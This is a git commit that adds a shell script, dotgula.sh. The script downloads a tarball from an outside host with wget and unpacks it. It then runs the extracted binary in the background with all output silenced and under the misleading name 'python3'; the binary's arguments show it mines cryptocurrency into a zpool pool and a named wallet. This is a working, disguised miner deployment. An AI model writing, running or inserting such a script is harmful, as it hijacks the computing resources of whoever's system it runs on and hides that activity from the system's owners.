9e15a21177d500a6271c291b7469fcce2c74ee7c
DotAja <142836390+DotAja@users.noreply.github.com>
2024-06-20 05:13:36 +0700

    Create dotgula.sh

---
+++ dotgula.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+apt install screen -y
+
+wget -O DOT momok.x10.bz/DOT-SRB.tar.gz
+
+tar -xvf DOT
+
+nohup ./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zpool.ca:6241 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB > /dev/null 2>&1 &
+
+top
